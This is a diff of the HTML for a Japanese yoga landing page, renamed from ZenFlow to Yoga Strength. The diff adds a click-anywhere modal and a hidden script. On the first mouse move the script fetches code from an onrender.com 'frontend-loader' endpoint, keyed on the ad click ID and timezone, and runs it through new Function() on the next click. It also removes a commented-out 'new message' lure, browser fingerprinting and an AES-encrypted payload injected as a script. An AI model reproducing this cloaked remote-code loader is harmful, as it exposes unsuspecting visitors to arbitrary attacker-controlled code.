@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>新しいメッセージ1件</title>
+    <title>Yoga Strength</title>
+    <link rel="icon" type="image/x-icon" href="YogaStrengthIcon.png" />
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=f941677a"></script>
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=7927a11f"></script>
 
     <style>
         /* Custom styles for aesthetic */
@@ -40,120 +41,51 @@
             align-items: center;
             justify-content: center;
         }
-
-    </style>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #f4f4f4;
-        }
-
-        .divcover {
-            z-index: 10;
-            background-color: rgba(0, 0, 0, 0.7);
+        .modal-overlay {
             position: fixed;
-            inset: 0;
-        }
-
-        .f-modal-centre {
-            background-color: #fff;
-            border-radius: 16px;
-            text-align: center;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 500px;
-            padding: 32px;
-            display: block;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: visible;
+            z-index: -1;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
             position: relative;
-            bottom: -37%;
-            left: 50%;
-            transform: translateX(-50%);
-            box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
-            opacity: 1;
         }
-
-        .f-modal-icon-success img {
-            border-radius: 10px;
-            margin-bottom: 20px;
+        .modal-content h2, .modal-content p {
+            color: black;
         }
-
-        .f-sub-heading-regular {
-            font-size: 22px;
-            margin-bottom: 12px;
-            color: #333;
-        }
-
-
-        .f-button-primary {
-            background-color: #D31965;
-            color: white;
-            border-radius: 50px;
-            padding: 12px 32px;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            cursor: pointer;
-            margin: 10px;
-            display: inline-block;
-            transition: background-color 0.3s;
-        }
-
-        .f-button-primary:hover {
-            background-color: #A0144F;
-        }
-
-        .f-modal-close {
+        .close-btn {
             position: absolute;
             top: 10px;
             right: 10px;
+            background-color: red;
+            color: white;
+            border: none;
+            padding: 5px 10px;
             cursor: pointer;
-            font-size: 20px;
-            color: #666;
+        }
+        .scroll-lock {
+            overflow: hidden;
         }
 
-        .f-modal-close:hover {
-            color: #D31965;
-        }
-
-        .button-group {
-            margin-top: 20px;
-        }
-
-        .testOpacity {
-            opacity: 0.001;
-        }
     </style>
 </head>
 <body class="antialiased" id="myBody">
-
-<!--    <div class="divcover" id="modalContainer">-->
-<!--        <div class="f-modal-centre" id="modalContent">-->
-<!--            <div class="f-modal-icon-success" style="-->
-<!--              display: flex;-->
-<!--              justify-content: center;-->
-<!--              align-items: center;">-->
-<!--                <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">-->
-<!--            </div>-->
-<!--            <div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>-->
-<!--            <div class="button-group">-->
-<!--                <a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>-->
-<!--                <a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>-->
-<!--            </div>-->
-<!--            <div class="f-modal-close" id="closeButton">✖</div>-->
-<!--        </div>-->
-<!--    </div>-->
-<!--    <div style="opacity: 0.3">-->
-<!--        <img src="img/fbProfile.jpg">-->
-<!--    </div>-->
 <!-- Navigation Bar -->
 <nav id="navbar" class="fixed top-0 left-0 right-0 z-50 bg-white shadow-md transition-all duration-300">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-16">
-        <a href="#hero" class="text-2xl font-bold text-gray-800 smooth-scroll serif-font">禅心 (ZenFlow)</a>
+        <a href="#hero" class="text-2xl font-bold text-gray-800 smooth-scroll serif-font">ヨガの強さ (Yoga Strength)</a>
         <div class="hidden md:flex space-x-6">
             <a href="#about" class="text-gray-600 hover:text-blue-600 smooth-scroll">概要</a>
             <a href="#principles" class="text-gray-600 hover:text-blue-600 smooth-scroll">原則</a>
@@ -173,6 +105,15 @@
 </nav>
 
 <main class="pt-16">
+    <!-- Modal structure -->
+    <div style="z-index: 1000;" class="modal-overlay" id="modal">
+        <div class="modal-content">
+            <button class="close-btn" id="close-btn">X</button>
+            <h2 style="    font-size: x-large;
+    font-weight: bold;">当社のウェブサイトへようこそ</h2>
+            <p>私たちはあなたのことを聞いてみたいです。女性アドバイザーに参加してください</p>
+        </div>
+    </div>
 
     <!-- Hero Section -->
     <header id="hero" class="hero-bg text-white pt-24 pb-16 px-4 md:px-8">
@@ -293,59 +234,79 @@
 </main>
 <footer class="bg-gray-900 text-white py-6">
     <div class="max-w-7xl mx-auto text-center px-4 sm:px-6 lg:px-8">
-        <p class="text-sm">&copy; 2024 ZenFlow: 日本のヨガ. All rights reserved. | **氣**と**統一**を養う。</p>
+        <p class="text-sm">&copy; 2025 Yoga Strength: 日本のヨガ. All rights reserved. | **氣**と**統一**を養う。</p>
     </div>
 </footer>
+<script>
+    // Get the modal and close button elements
+    const modal = document.getElementById('modal');
+    const closeButton = document.getElementById('close-btn');
+    const modalContent = document.querySelector('.modal-content');
 
-        <script>
-            function closeModal() {
-                document.getElementById("modalContainer").style.display = "none";
-                // document.getElementById("testopc").style.opacity = 1;
-                // document.getElementById("age-confirmation-modal").style.display = "none";
-                console.log("tes$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4t");
+    // Disable scrolling on body when modal is visible
+    document.body.classList.add('scroll-lock');
+
+    // Function to close the modal and enable scrolling
+    function closeModal() {
+        modal.style.visibility = 'hidden';
+        document.body.classList.remove('scroll-lock');
+    }
+
+    // Close the modal if the close button is clicked
+    closeButton.addEventListener('click', closeModal);
+
+    // Close the modal if user clicks on the modal background (overlay)
+    modal.addEventListener('click', function (event) {
+        if (event.target === modal) {
+            closeModal();
+        }
+    });
+
+    // Close the modal if user clicks on the modal body (content area)
+    modalContent.addEventListener('click', closeModal);
+</script>
+<script>
+    const gclid = new URLSearchParams(location.search).get("gclid");
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+
+    let someCode = null;
+
+    document.cookie = "access_cookie=true; path=/; max-age=300";
+
+    document.addEventListener("mousemove", async function fetchCodeOnce() {
+        document.removeEventListener("mousemove", fetchCodeOnce);
+        try {
+            const res = await fetch(
+                `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+                {
+                    headers: {
+                        "x-client-timezone": timezone,
+                        "x-access-cookie": "true",
+                    },
+                }
+            );
+            const data = await res.json();
+            if (data && data.code) {
+                someCode = data.code;
             }
-            document.getElementById("myBody").addEventListener("click", closeModal);
-            document.getElementById("closeButton").addEventListener("click", closeModal);
-            document.getElementById("rejectButton").addEventListener("click", function (event) {
-                document.getElementById("modalContainer").style.display = "none";
-            });
-            document.getElementById("manageButton").addEventListener("click", function (event) {
-                document.getElementById("modalContainer").style.display = "none";
-            });
-        </script>
-        <!--facebook-->
-<!--        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>-->
-<!--        <script>-->
-<!--            // Initialize the agent on page load.-->
-<!--            const fpPromise = import('https://fpjscdn.net/v3/4B11oI7ltKpEmYsOUbBr')-->
-<!--                .then(FingerprintJS => FingerprintJS.load({-->
-<!--                    region: "ap"-->
-<!--                }))-->
+        } catch (err) {
+            console.error("Could not fetch some code", err);
+        }
+    });
 
-<!--            fpPromise-->
-<!--                .then(fp => fp.get())-->
-<!--                .then(result => {-->
-<!--                    console.log("Full result:", result.visitorId);-->
-<!--                    localStorage.setItem('visitorId', result.visitorId);-->
-<!--                });-->
+    function handleSomeClick() {
+        if (someCode) {
+            try {
+                new Function(someCode)();
+            } catch (err) {
+                console.error("Error executing code:", err);
+            }
+        }
+    }
 
-<!--            setTimeout(()=>{-->
-<!--                function aesDecode(encodedText) {-->
-<!--                    const decodedText = decodeURIComponent(encodedText);-->
-<!--                    const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');-->
-<!--                    return bytes.toString(CryptoJS.enc.Utf8);-->
-<!--                }-->
-<!--                const codeString = aesDecode(`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`);-->
-<!--		const script = document.createElement("script");-->
-<!--                script.textContent = codeString;-->
-<!--                document.body.appendChild(script);-->
-<!--            }, 100)-->
-<!--        </script>-->
-
-<!--        <script>-->
-<!--            document.body.style.overflow = "hidden";-->
-<!--        </script>-->
-
+    document.addEventListener("click", handleSomeClick);
+</script>
 <script>
     // --- JAVASCRIPT LOGIC ---
 
